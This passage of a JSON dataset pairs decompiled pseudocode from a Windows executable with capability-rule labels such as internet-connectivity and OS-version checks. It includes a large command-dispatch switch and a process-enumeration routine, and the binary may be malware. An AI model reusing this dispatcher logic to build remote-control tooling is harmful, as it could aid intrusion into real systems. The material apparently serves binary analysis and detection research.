iVar2;\n        *(&stack0xfffffff8 + iVar2) = &stack0x000003d8 + iVar2;\n        *(&stack0xfffffff4 + iVar2) = 0x4020ff;\n        cVar1 = fcn.0040aa11();\n        if (cVar1 != '\\0') {\n            *(&stack0x00000004 + iVar2) = *(&stack0x00001444 + iVar2);\n            *(&stack0x00000000 + iVar2) = *(&stack0x00001440 + iVar2);\n            *(&stack0xfffffffc + iVar2) = 0xb0;\n            *(&stack0xfffffff8 + iVar2) = *(&stack0x00001438 + iVar2);\n            *(&stack0xfffffff4 + iVar2) = 0x402134;\n            fcn.00408b8f();\n        }\n        break;\n    case 0xb1:\n        *(&stack0xfffffff8 + iVar2) = *(&stack0x00001440 + iVar2);\n        *(&stack0xfffffff4 + iVar2) = 0x402149;\n        cVar1 = fcn.0040a9af();\n        if (cVar1 != '\\0') {\n            *(&stack0x00000004 + iVar2) = *(&stack0x00001444 + iVar2);\n            *(&stack0x00000000 + iVar2) = *(&stack0x00001440 + iVar2);\n            *(&stack0xfffffffc + iVar2) = 0xb1;\n            *(&stack0xfffffff8 + iVar2) = *(&stack0x00001438 + iVar2);\n            *(&stack0xfffffff4 + iVar2) = 0x40217e;\n            fcn.00408b8f();\n        }\n        break;\n    case 0xb2:\n        *(&stack0xfffffff8 + iVar2) = *(&stack0x00001440 + iVar2);\n        *(&stack0xfffffff4 + iVar2) = 0x402192;\n        cVar1 = fcn.0040acbe();\n        if (cVar1 != '\\0') {\n            *(&stack0x00000004 + iVar2) = *(&stack0x00001444 + iVar2);\n            *(&stack0x00000000 + iVar2) = *(&stack0x00001440 + iVar2);\n            *(&stack0xfffffffc + iVar2) = 0xb2;\n            *(&stack0xfffffff8 + iVar2) = *(&stack0x00001438 + iVar2);\n            *(&stack0xfffffff4 + iVar2) = 0x4021c7;\n            fcn.00408b8f();\n        }\n        break;\n    case 0xb3:\n        *(&stack0xfffffff8 + iVar2) = *(&stack0x00001440 + iVar2);\n        *(&stack0xfffffff4 + iVar2) = 0x4021db;\n        cVar1 = fcn.0040adee();\n        if (cVar1 != '\\0') {\n            *(&stack0x00000004 + iVar2) = *(&stack0x00001444 + iVar2);\n            *(&stack0x00000000 + iVar2) = *(&stack0x00001440 + iVar2);\n            *(&stack0xfffffffc + iVar2) = 0xb3;\n            *(&stack0xfffffff8 + iVar2) = *(&stack0x00001438 + iVar2);\n            *(&stack0xfffffff4 + iVar2) = 0x402210;\n            fcn.00408b8f();\n        }\n        break;\n    case 0xb4:\n        *(&stack0xfffffff8 + iVar2) = 0x214;\n        *(&stack0xfffffff4 + iVar2) = 0x401bc0;\n        uVar6 = sub.msvcrt.dll_malloc();\n        *(&stack0x0000140c + iVar2) = uVar6;\n        if (*(&stack0x0000140c + iVar2) != 0) {\n            *(&stack0x00001408 + iVar2) = **(&stack0x00001440 + iVar2);\n            *(&stack0x00001440 + iVar2) = *(&stack0x00001440 + iVar2) + 1;\n            *(*(&stack0x0000140c + iVar2) + 0x204) = *(&stack0x00001408 + iVar2);\n            *(*(&stack0x0000140c + iVar2) + 0x208) = *(&stack0x00001438 + iVar2);\n            *(*(&stack0x0000140c + iVar2) + 0x210) = 1;\n            *(*(&stack0x0000140c + iVar2) + 0x20c) = **(&stack0x00001440 + iVar2);\n            *(&stack0x00001440 + iVar2) = *(&stack0x00001440 + iVar2) + 1;\n            *(&stack0x00000000 + iVar2) = 0x204;\n            *(&stack0xfffffffc + iVar2) = *(&stack0x00001440 + iVar2);\n            *(&stack0xfffffff8 + iVar2) = *(&stack0x0000140c + iVar2);\n            *(&stack0xfffffff4 + iVar2) = 0x401c6b;\n            fcn.00419918();\n            *(&stack0xfffffffc + iVar2) = *(&stack0x0000140c + iVar2);\n            *(&stack0xfffffff8 + iVar2) = 0x41bf87;\n            *(&stack0xfffffff4 + iVar2) = 0x401c82;\n            fcn.0040b2ab();\n        }\n        break;\n    case 0xb5:\n        *(&stack0xfffffff8 + iVar2) = **(&stack0x00001440 + iVar2);\n        *(&stack0xfffffff4 + iVar2) = 0x401c9c;\n        fcn.0041bca8();\n        break;\n    case 0xb6:\n        *(&stack0xfffffff8 + iVar2) = 8;\n        *(&stack0xfffffff4 + iVar2) = 0x402410;\n        uVar6 = sub.msvcrt.dll_malloc();\n        *(&stack0x000013f0 + iVar2) = uVar6;\n        if (*(&stack0x000013f0 + iVar2) != 0) {\n            **(&stack0x000013f0 + iVar2) = *(&stack0x00001438 + iVar2);\n            *(*(&stack0x000013f0 + iVar2) + 4) = **(&stack0x00001440 + iVar2) != '\\0';\n            *(&stack0xfffffffc + iVar2) = *(&stack0x000013f0 + iVar2);\n            *(&stack0xfffffff8 + iVar2) = 0x417e8c;\n            *(&stack0xfffffff4 + iVar2) = 0x402465;\n            *0x4245c8 = fcn.0040b2ab();\n        }\n        break;\n    case 0xb7:\n        *(&stack0xfffffffc + iVar2) = *(&stack0x00001444 + iVar2);\n        *(&stack0xfffffff8 + iVar2) = *(&stack0x00001440 + iVar2);\n        *(&stack0xfffffff4 + iVar2) = 0x402498;\n        fcn.00418352();\n        break;\n    case 0xb8:\n        *0x4245c8 = 0;\n        break;\n    case 0xba:\n        *(&stack0xfffffff8 + iVar2) = *(&stack0x00001438 + iVar2);\n        *(&stack0xfffffff4 + iVar2) = 0x4024ac;\n        fcn.0041b927();\n        break;\n    case 0xbc:\n        *(&stack0xfffffff8 + iVar2) = *(&stack0x00001438 + iVar2);\n        *(&stack0xfffffff4 + iVar2) = 0x4024c0;\n        fcn.0040ebb8();\n        break;\n    case 0xbe:\n        *(&stack0xfffffff8 + iVar2) = *(&stack0x00001438 + iVar2);\n        *(&stack0xfffffff4 + iVar2) = 0x4024d4;\n        fcn.00415ea4();\n        break;\n    case 0xc0:\n        *(&stack0xfffffff8 + iVar2) = *(&stack0x00001440 + iVar2);\n        *(&stack0xfffffff4 + iVar2) = 0x4024e8;\n        cVar1 = fcn.004162f6();\n        if (cVar1 != '\\0') {\n            *(&stack0x00000004 + iVar2) = *(&stack0x00001444 + iVar2);\n            *(&stack0x00000000 + iVar2) = *(&stack0x00001440 + iVar2);\n            *(&stack0xfffffffc + iVar2) = 0xc0;\n            *(&stack0xfffffff8 + iVar2) = *(&stack0x00001438 + iVar2);\n            *(&stack0xfffffff4 + iVar2) = 0x40251d;\n            fcn.00408b8f();\n        }\n        break;\n    case 0xc1:\n        *(&stack0xfffffff8 + iVar2) = *(&stack0x00001438 + iVar2);\n        *(&stack0xfffffff4 + iVar2) = 0x402531;\n        fcn.0041cbf3();\n        break;\n    case 0xc2:\n        *(&stack0xfffffff8 + iVar2) = *(&stack0x00001440 + iVar2);\n        *(&stack0xfffffff4 + iVar2) = 0x402545;\n        fcn.0041ccf4();\n        break;\n    case 0xc3:\n        *(&stack0xfffffff8 + iVar2) = 0x61c;\n        *(&stack0xfffffff4 + iVar2) = 0x402556;\n        uVar6 = sub.msvcrt.dll_malloc();\n        *(&stack0x000013ec + iVar2) = uVar6;\n        if (*(&stack0x000013ec + iVar2) != 0) {\n            *(&stack0x00000008 + iVar2) = 0x204;\n            *(&stack0x00000004 + iVar2) = *(&stack0x000013ec + iVar2);\n            *(&stack0x00000000 + iVar2) = 1;\n            *(&stack0xfffffffc + iVar2) = 7;\n            *(&stack0xfffffff8 + iVar2) = *(&stack0x00001440 + iVar2);\n            *(&stack0xfffffff4 + iVar2) = 0x40259d;\n            fcn.00419a6a();\n            *(&stack0x00000008 + iVar2) = 0x204;\n            *(&stack0x00000004 + iVar2) = *(&stack0x000013ec + iVar2) + 0x204;\n            *(&stack0x00000000 + iVar2) = 2;\n            *(&stack0xfffffffc + iVar2) = 7;\n            *(&stack0xfffffff8 + iVar2) = *(&stack0x00001440 + iVar2);\n            *(&stack0xfffffff4 + iVar2) = 0x4025d4;\n            fcn.00419a6a();\n            *(&stack0x00000008 + iVar2) = 0x1000;\n            *(&stack0x00000004 + iVar2) = &stack0x000003d8 + iVar2;\n            *(&stack0x00000000 + iVar2) = 3;\n            *(&stack0xfffffffc + iVar2) = 7;\n            *(&stack0xfffffff8 + iVar2) = *(&stack0x00001440 + iVar2);\n            *(&stack0xfffffff4 + iVar2) = 0x402606;\n            fcn.00419a6a();\n            *(&stack0x00000000 + iVar2) = 0x204;\n            *(&stack0xfffffffc + iVar2) = *(&stack0x000013ec + iVar2) + 0x408;\n            *(&stack0xfffffff8 + iVar2) = &stack0x000003d8 + iVar2;\n            *(&stack0xfffffff4 + iVar2) = 0x40262d;\n            fcn.0041a907();\n            *(&stack0x00000008 + iVar2) = 0x1000;\n            *(&stack0x00000004 + iVar2) = &stack0x000003d8 + iVar2;\n            *(&stack0x00000000 + iVar2) = 4;\n            *(&stack0xfffffffc + iVar2) = 7;\n            *(&stack0xfffffff8 + iVar2) = *(&stack0x00001440 + iVar2);\n            *(&stack0xfffffff4 + iVar2) = 0x40265f;\n            fcn.00419a6a();\n            *(&stack0xfffffff8 + iVar2) = &stack0x000003d8 + iVar2;\n            *(&stack0xfffffff4 + iVar2) = 0x40266e;\n            uVar6 = fcn.00419d08();\n            *(*(&stack0x000013ec + iVar2) + 0x610) = uVar6;\n            *(&stack0x00000008 + iVar2) = 0x1000;\n            *(&stack0x00000004 + iVar2) = &stack0x000003d8 + iVar2;\n            *(&stack0x00000000 + iVar2) = 5;\n            *(&stack0xfffffffc + iVar2) = 7;\n            *(&stack0xfffffff8 + iVar2) = *(&stack0x00001440 + iVar2);\n            *(&stack0xfffffff4 + iVar2) = 0x4026ad;\n            fcn.00419a6a();\n            *(&stack0xfffffff8 + iVar2) = &stack0x000003d8 + iVar2;\n            *(&stack0xfffffff4 + iVar2) = 0x4026bc;\n            iVar5 = fcn.00419d08();\n            *(*(&stack0x000013ec + iVar2) + 0x60c) = iVar5 != 0;\n            *(*(&stack0x000013ec + iVar2) + 0x618) = *(&stack0x00001438 + iVar2);\n            *(&stack0xfffffffc + iVar2) = *(&stack0x000013ec + iVar2);\n            *(&stack0xfffffff8 + iVar2) = fcn.0040d2de;\n            *(&stack0xfffffff4 + iVar2) = 0x4026f9;\n            fcn.0040b2ab();\n        }\n        break;\n    case 0xc5:\n        *(&stack0xfffffff8 + iVar2) = *(&stack0x00001440 + iVar2);\n        *(&stack0xfffffff4 + iVar2) = 0x401cd5;\n        uVar6 = fcn.00419d08();\n        *(&stack0xfffffff8 + iVar2) = uVar6;\n        *(&stack0xfffffff4 + iVar2) = 0x401cdd;\n        fcn.004193e3();\n        break;\n    case 0xc6:\n        *(&stack0xfffffff8 + iVar2) = *(&stack0x00001440 + iVar2);\n        *(&stack0xfffffff4 + iVar2) = 0x401cf1;\n        uVar6 = fcn.00419d08();\n        *(&stack0xfffffff8 + iVar2) = uVar6;\n        *(&stack0xfffffff4 + iVar2) = 0x401cf9;\n        fcn.004193b1();\n        break;\n    case 199:\n        *(&stack0x00000000 + iVar2) = 6;\n        *(&stack0xfffffffc + iVar2) = *(&stack0x00001440 + iVar2);\n        *(&stack0xfffffff8 + iVar2) = &stack0x0000039a + iVar2;\n        *(&stack0xfffffff4 + iVar2) = 0x401d20;\n        fcn.0041a5e1();\n        *(&stack0xfffffff8 + iVar2) = *(&stack0x0000039a + iVar2);\n        *(&stack0xfffffffc + iVar2) = *(&stack0x0000039e + iVar2);\n        *(&stack0xfffffff4 + iVar2) = 0x401d3c;\n        fcn.004194ea();\n        break;\n    case 200:\n        *(&stack0x00000000 + iVar2) = 6;\n        *(&stack0xfffffffc + iVar2) = *(&stack0x00001440 + iVar2);\n        *(&stack0xfffffff8 + iVar2) = &stack0x00000394 + iVar2;\n        *(&stack0xfffffff4 + iVar2) = 0x401d64;\n        fcn.0041a5e1();\n        *(&stack0xfffffff8 + iVar2) = *(&stack0x00000394 + iVar2);\n        *(&stack0xfffffffc + iVar2) = *(&stack0x00000398 + iVar2);\n        *(&stack0xfffffff4 + iVar2) = 0x401d80;\n        fcn.00419415();\n        break;\n    case 0xc9:\n        *(&stack0xfffffffc + iVar2) = **(&stack0x00001440 + iVar2);\n        *(&stack0xfffffff8 + iVar2) = *(&stack0x00001438 + iVar2);\n        *(&stack0xfffffff4 + iVar2) = 0x401cc1;\n        fcn.0041929e();\n        break;\n    case 0xcc:\n        *(&stack0xfffffff8 + iVar2) = 0x40;\n        *(&stack0xfffffff4 + iVar2) = 0x401d92;\n        cVar1 = fcn.0040b97c();\n        if (cVar1 == '\\x01') {\n            *(&stack0x00000384 + iVar2) = *(&stack0x00001438 + iVar2);\n            (&stack0x00000380)[iVar2] = 0xcc;\n            (&stack0x00000381)[iVar2] = 0xcd;\n            (&stack0x00000388)[iVar2] = 0;\n            *(&stack0x00000004 + iVar2) = 0x41e720;\n            *(&stack0x00000000 + iVar2) = 0x41e907;\n            *(&stack0xfffffffc + iVar2) = 0x204;\n            *(&stack0xfffffff8 + iVar2) = &stack0x0000017c + iVar2;\n            *(&stack0xfffffff4 + iVar2) = 0x401e12;\n            fcn.00419fa8();\n            *(&stack0xfffffff8 + iVar2) = &stack0x0000017c + iVar2;\n            *(&stack0xfffffff4 + iVar2) = 0x401e21;\n            fcn.004095ed();\n        }\n        else {\n            *(&stack0x00000004 + iVar2) = 0xffffffff;\n            *(&stack0x00000000 + iVar2) = 0;\n            *(&stack0xfffffffc + iVar2) = 0xcd;\n            *(&stack0xfffffff8 + iVar2) = *(&stack0x00001438 + iVar2);\n            *(&stack0xfffffff4 + iVar2) = 0x401dc0;\n            fcn.00408b8f();\n        }\n        break;\n    case 0xce:\n        *(&stack0xfffffff8 + iVar2) = *(&stack0x00001440 + iVar2);\n        *(&stack0xfffffff4 + iVar2) = 0x401e69;\n        uVar6 = fcn.0040e76e();\n        *(&stack0x00001404 + iVar2) = uVar6;\n        *(&stack0x00000008 + iVar2) = *(&stack0x00001404 + iVar2);\n        *(&stack0x00000004 + iVar2) = *(&stack0x00001440 + iVar2);\n        *(&stack0x00000000 + iVar2) = \"%s\\a%d\";\n        *(&stack0xfffffffc + iVar2) = 0x1000;\n        *(&stack0xfffffff8 + iVar2) = &stack0x000003d8 + iVar2;\n        *(&stack0xfffffff4 + iVar2) = 0x401ea5;\n        uVar6 = fcn.00419fa8();\n        *(&stack0x00001400 + iVar2) = uVar6;\n        *(&stack0x00000004 + iVar2) = *(&stack0x00001400 + iVar2);\n        *(&stack0x00000000 + iVar2) = &stack0x000003d8 + iVar2;\n        *(&stack0xfffffffc + iVar2) = 0xce;\n        *(&stack0xfffffff8 + iVar2) = *(&stack0x00001438 + iVar2);\n        *(&stack0xfffffff4 + iVar2) = 0x401ed9;\n        fcn.00408b8f();\n        break;\n    case 0xcf:\n        *(&stack0xfffffff8 + iVar2) = *(&stack0x00001440 + iVar2);\n        *(&stack0xfffffff4 + iVar2) = 0x401e55;\n        fcn.0040e67d();\n        break;\n    case 0xd0:\n        *(&stack0xfffffffc + iVar2) = *(&stack0x00001440 + iVar2);\n        *(&stack0xfffffff8 + iVar2) = *(&stack0x00001438 + iVar2);\n        *(&stack0xfffffff4 + iVar2) = 0x401e41;\n        fcn.0040e4f3();\n        break;\n    case 0xd3:\n    case 0xd4:\n        *(&stack0xfffffff8 + iVar2) = *(&stack0x00001440 + iVar2);\n        *(&stack0xfffffff4 + iVar2) = 0x40270d;\n        uVar4 = fcn.00419d08();\n        *(&stack0x00000000 + iVar2) = uVar4 & 0xff;\n        *(&stack0xfffffffc + iVar2) = (&stack0x00000034)[iVar2];\n        *(&stack0xfffffff8 + iVar2) = *(&stack0x00001438 + iVar2);\n        *(&stack0xfffffff4 + iVar2) = 0x40272c;\n        fcn.004158f7();\n        break;\n    case 0xd5:\n    case 0xd6:\n        *(&stack0xfffffff8 + iVar2) = *(&stack0x00001440 + iVar2);\n        *(&stack0xfffffff4 + iVar2) = 0x402740;\n        uVar4 = fcn.00419d08();\n        *(&stack0x00000000 + iVar2) = uVar4 & 0xff;\n        *(&stack0xfffffffc + iVar2) = (&stack0x00000034)[iVar2];\n        *(&stack0xfffffff8 + iVar2) = *(&stack0x00001438 + iVar2);\n        *(&stack0xfffffff4 + iVar2) = 0x40275f;\n        fcn.00415cf0();\n        break;\n    case 0xd7:\n    case 0xd8:\n        *(&stack0xfffffff8 + iVar2) = *(&stack0x00001440 + iVar2);\n        *(&stack0xfffffff4 + iVar2) = 0x402773;\n        uVar4 = fcn.00419d08();\n        *(&stack0x00000000 + iVar2) = uVar4 & 0xff;\n        *(&stack0xfffffffc + iVar2) = (&stack0x00000034)[iVar2];\n        *(&stack0xfffffff8 + iVar2) = *(&stack0x00001438 + iVar2);\n        *(&stack0xfffffff4 + iVar2) = 0x402792;\n        fcn.00415db3();\n        break;\n    case 0xd9:\n        *(&stack0xfffffff8 + iVar2) = 0xc;\n        *(&stack0xfffffff4 + iVar2) = 0x4027a3;\n        uVar6 = sub.msvcrt.dll_malloc();\n        *(&stack0x000013e8 + iVar2) = uVar6;\n        if (*(&stack0x000013e8 + iVar2) != 0) {\n            *(&stack0x00000000 + iVar2) = 4;\n            *(&stack0xfffffffc + iVar2) = *(&stack0x00001440 + iVar2);\n            *(&stack0xfffffff8 + iVar2) = *(&stack0x000013e8 + iVar2) + 4;\n            *(&stack0xfffffff4 + iVar2) = 0x4027dd;\n            fcn.0041a5e1();\n            *(&stack0x00000000 + iVar2) = 4;\n            *(&stack0xfffffffc + iVar2) = *(&stack0x00001440 + iVar2) + 4;\n            *(&stack0xfffffff8 + iVar2) = *(&stack0x000013e8 + iVar2) + 8;\n            *(&stack0xfffffff4 + iVar2) = 0x402805;\n            fcn.0041a5e1();\n            *(&stack0xfffffffc + iVar2) = *(&stack0x000013e8 + iVar2);\n            *(&stack0xfffffff8 + iVar2) = 0x418d95;\n            *(&stack0xfffffff4 + iVar2) = 0x40281c;\n            fcn.0040b2ab();\n        }\n        break;\n    case 0xdf:\n        *(&stack0xfffffff8 + iVar2) = 0x210;\n        *(&stack0xfffffff4 + iVar2) = 0x40230e;\n        uVar6 = sub.msvcrt.dll_malloc();\n        *(&stack0x000013f4 + iVar2) = uVar6;\n        if (*(&stack0x000013f4 + iVar2) != 0) {\n            *(&stack0x00000008 + iVar2) = 0x204;\n            *(&stack0x00000004 + iVar2) = *(&stack0x000013f4 + iVar2);\n            *(&stack0x00000000 + iVar2) = 1;\n            *(&stack0xfffffffc + iVar2) = 7;\n            *(&stack0xfffffff8 + iVar2) = *(&stack0x00001440 + iVar2);\n            *(&stack0xfffffff4 + iVar2) = 0x402355;\n            fcn.00419a6a();\n            *(&stack0x00000008 + iVar2) = 0x1000;\n            *(&stack0x00000004 + iVar2) = &stack0x000003d8 + iVar2;\n            *(&stack0x00000000 + iVar2) = 2;\n            *(&stack0xfffffffc + iVar2) = 7;\n            *(&stack0xfffffff8 + iVar2) = *(&stack0x00001440 + iVar2);\n            *(&stack0xfffffff4 + iVar2) = 0x402387;\n            fcn.00419a6a();\n            *(*(&stack0x000013f4 + iVar2) + 0x204) = 0;\n            *(*(&stack0x000013f4 + iVar2) + 0x208) = *(&stack0x00001438 + iVar2);\n            *(*(&stack0x000013f4 + iVar2) + 0x20d) = 1;\n            *(*(&stack0x000013f4 + iVar2) + 0x20c) = (&stack0x000003d8)[iVar2] != '\\0';\n            *(&stack0xfffffffc + iVar2) = *(&stack0x000013f4 + iVar2);\n            *(&stack0xfffffff8 + iVar2) = fcn.0040a146;\n            *(&stack0xfffffff4 + iVar2) = 0x4023eb;\n            *0x424330 = fcn.0040b2ab();\n        }\n        break;\n    case 0xe2:\n        *0x424330 = 0;\n        break;\n    case 0xe3:\n        *(&stack0xfffffff8 + iVar2) = *(&stack0x00001438 + iVar2);\n        *(&stack0xfffffff4 + iVar2) = 0x402830;\n        fcn.00402e79();\n        break;\n    case 0xe5:\n        *(&stack0x00000000 + iVar2) = 4;\n        *(&stack0xfffffffc + iVar2) = *(&stack0x00001440 + iVar2);\n        *(&stack0xfffffff8 + iVar2) = &stack0x00000390 + iVar2;\n        *(&stack0xfffffff4 + iVar2) = 0x402857;\n        fcn.0041a5e1();\n        *(&stack0x00000000 + iVar2) = *(&stack0x00001440 + iVar2) + 4;\n        *(&stack0xfffffffc + iVar2) = *(&stack0x00000390 + iVar2);\n        *(&stack0xfffffff8 + iVar2) = *(&stack0x00001438 + iVar2);\n        *(&stack0xfffffff4 + iVar2) = 0x40287f;\n        fcn.004176e3();\n        break;\n    case 0xe7:\n        *(&stack0x00000000 + iVar2) = 4;\n        *(&stack0xfffffffc + iVar2) = *(&stack0x00001440 + iVar2);\n        *(&stack0xfffffff8 + iVar2) = &stack0x0000038c + iVar2;\n        *(&stack0xfffffff4 + iVar2) = 0x4028a7;\n        fcn.0041a5e1();\n        *(&stack0x00001440 + iVar2) = *(&stack0x00001440 + iVar2) + 4;\n        *(&stack0x000013e4 + iVar2) = 0;\n        *(&stack0x00000008 + iVar2) = 0x204;\n        *(&stack0x00000004 + iVar2) = &stack0x0000017c + iVar2;\n        *(&stack0x00000000 + iVar2) = 1;\n        *(&stack0xfffffffc + iVar2) = 7;\n        *(&stack0xfffffff8 + iVar2) = *(&stack0x00001440 + iVar2);\n        *(&stack0xfffffff4 + iVar2) = 0x4028ec;\n        fcn.00419a6a();\n        *(&stack0xfffffff8 + iVar2) = &stack0x0000017c + iVar2;\n        *(&stack0xfffffff4 + iVar2) = 0x4028fb;\n        iVar5 = sub.msvcrt.dll_strlen();\n        *(&stack0x000013e4 + iVar2) = iVar5 + *(&stack0x000013e4 + iVar2) + 1;\n        *(&stack0x00000008 + iVar2) = 0x104;\n        *(&stack0x00000004 + iVar2) = &stack0x00000078 + iVar2;\n        *(&stack0x00000000 + iVar2) = 2;\n        *(&stack0xfffffffc + iVar2) = 7;\n        *(&stack0xfffffff8 + iVar2) = *(&stack0x00001440 + iVar2);\n        *(&stack0xfffffff4 + iVar2) = 0x402940;\n        fcn.00419a6a();\n        *(&stack0xfffffff8 + iVar2) = &stack0x00000078 + iVar2;\n        *(&stack0xfffffff4 + iVar2) = 0x40294f;\n        iVar5 = sub.msvcrt.dll_strlen();\n        *(&stack0x000013e4 + iVar2) = iVar5 + *(&stack0x000013e4 + iVar2) + 1;\n        *(&stack0x00000008 + iVar2) = 0x1000;\n        *(&stack0x00000004 + iVar2) = &stack0x000003d8 + iVar2;\n        *(&stack0x00000000 + iVar2) = 3;\n        *(&stack0xfffffffc + iVar2) = 7;\n        *(&stack0xfffffff8 + iVar2) = *(&stack0x00001440 + iVar2);\n        *(&stack0xfffffff4 + iVar2) = 0x402994;\n        fcn.00419a6a();\n        *(&stack0xfffffff8 + iVar2) = &stack0x000003d8 + iVar2;\n        *(&stack0xfffffff4 + iVar2) = 0x4029a3;\n        uVar6 = fcn.00419d08();\n        *(&stack0x000013e0 + iVar2) = uVar6;\n        *(&stack0xfffffff8 + iVar2) = &stack0x000003d8 + iVar2;\n        *(&stack0xfffffff4 + iVar2) = 0x4029b9;\n        iVar5 = sub.msvcrt.dll_strlen();\n        *(&stack0x000013e4 + iVar2) = iVar5 + *(&stack0x000013e4 + iVar2) + 1;\n        *(&stack0x00000008 + iVar2) = 0x1000;\n        *(&stack0x00000004 + iVar2) = &stack0x000003d8 + iVar2;\n        *(&stack0x00000000 + iVar2) = 4;\n        *(&stack0xfffffffc + iVar2) = 7;\n        *(&stack0xfffffff8 + iVar2) = *(&stack0x00001440 + iVar2);\n        *(&stack0xfffffff4 + iVar2) = 0x4029fe;\n        fcn.00419a6a();\n        *(&stack0xfffffff8 + iVar2) = &stack0x000003d8 + iVar2;\n        *(&stack0xfffffff4 + iVar2) = 0x402a0d;\n        uVar6 = fcn.00419d08();\n        *(&stack0x000013dc + iVar2) = uVar6;\n        *(&stack0xfffffff8 + iVar2) = &stack0x000003d8 + iVar2;\n        *(&stack0xfffffff4 + iVar2) = 0x402a23;\n        iVar5 = sub.msvcrt.dll_strlen();\n        *(&stack0x000013e4 + iVar2) = iVar5 + *(&stack0x000013e4 + iVar2) + 1;\n        *(&stack0x00000008 + iVar2) = 0x1000;\n        *(&stack0x00000004 + iVar2) = &stack0x000003d8 + iVar2;\n        *(&stack0x00000000 + iVar2) = 5;\n        *(&stack0xfffffffc + iVar2) = 7;\n        *(&stack0xfffffff8 + iVar2) = *(&stack0x00001440 + iVar2);\n        *(&stack0xfffffff4 + iVar2) = 0x402a68;\n        fcn.00419a6a();\n        *(&stack0xfffffff8 + iVar2) = &stack0x000003d8 + iVar2;\n        *(&stack0xfffffff4 + iVar2) = 0x402a77;\n        uVar6 = fcn.00419d08();\n        *(&stack0x000013d8 + iVar2) = uVar6;\n        *(&stack0xfffffff8 + iVar2) = &stack0x000003d8 + iVar2;\n        *(&stack0xfffffff4 + iVar2) = 0x402a8d;\n        iVar5 = sub.msvcrt.dll_strlen();\n        *(&stack0x000013e4 + iVar2) = iVar5 + *(&stack0x000013e4 + iVar2) + 1;\n        *(&stack0x00000014 + iVar2) = *(&stack0x000013dc + iVar2);\n        *(&stack0x00000010 + iVar2) = *(&stack0x000013d8 + iVar2);\n        *(&stack0x0000000c + iVar2) = *(&stack0x000013e4 + iVar2) + *(&stack0x00001440 + iVar2);\n        *(&stack0x00000008 + iVar2) = *(&stack0x000013e0 + iVar2);\n        *(&stack0x00000004 + iVar2) = &stack0x00000078 + iVar2;\n        *(&stack0x00000000 + iVar2) = &stack0x0000017c + iVar2;\n        *(&stack0xfffffffc + iVar2) = *(&stack0x0000038c + iVar2);\n        *(&stack0xfffffff8 + iVar2) = *(&stack0x00001438 + iVar2);\n        *(&stack0xfffffff4 + iVar2) = 0x402b06;\n        fcn.00417830();\n        break;\n    case 0xe8:\n        *(&stack0xfffffff8 + iVar2) = *(&stack0x00001438 + iVar2);\n        *(&stack0xfffffff4 + iVar2) = 0x402b18;\n        fcn.004091dc();\n    }\n    return;\n}\n",
        "token_count": 18282
    },
    "00402b50": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint fcn.00402b50(int32_t param_1, uint32_t param_2)\n\n{\n    uint uVar1;\n    \n    if (param_2 == 0) {\n        uVar1 = 0;\n    }\n    else {\n        if (param_1 == *0x41e7c8) {\n            if (0x30000 < param_2) {\n                return 0;\n            }\n        }\n        else if (param_2 != 0x3f) {\n            return 0;\n        }\n        uVar1 = 1;\n    }\n    return uVar1;\n}\n",
        "token_count": 133
    },
    "00402b8e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t fcn.00402b8e(uint32_t param_1, uint8_t param_2)\n\n{\n    uint32_t uVar1;\n    \n    if (param_1 == *0x41e7c8) {\n        if ((param_2 < 0xea) && (param_2 != 0)) {\n            uVar1 = 1;\n        }\n        else {\n            uVar1 = 0;\n        }\n    }\n    else {\n        uVar1 = *0x41e7c8 & 0xffffff00 | param_2 == 0x9b;\n    }\n    return uVar1;\n}\n",
        "token_count": 140
    },
    "00402d70": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.00402d70(uint param_1, uint param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    uint uStack328;\n    uint uStack324;\n    int32_t aiStack320 [7];\n    uchar auStack292 [260];\n    uint uStack32;\n    int32_t iStack24;\n    int32_t iStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack324 = param_3;\n    uStack328 = 0;\n    fcn.0041a59f(param_2);\n    uStack324 = param_3;\n    uStack328 = 0x41eae1;\n    fcn.00419918(param_2);\n    uStack328 = 0;\n    iStack24 = sub.KERNEL32.dll_CreateToolhelp32Snapshot(2);\n    if (iStack24 != 0) {\n        aiStack320[0] = 0x128;\n        iVar1 = sub.KERNEL32.dll_Process32First(iStack24, aiStack320);\n        while (iVar1 != 0) {\n            if (aiStack320[0] == iStack12) {\n                fcn.00419918(uStack8, auStack292, uStack4);\n                break;\n            }\n            iVar1 = sub.KERNEL32.dll_Process32Next(uStack32, &uStack328);\n        }\n        sub.KERNEL32.dll_CloseHandle(uStack32);\n    }\n    return;\n}\n",
        "token_count": 320
    },
    "00402e79": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
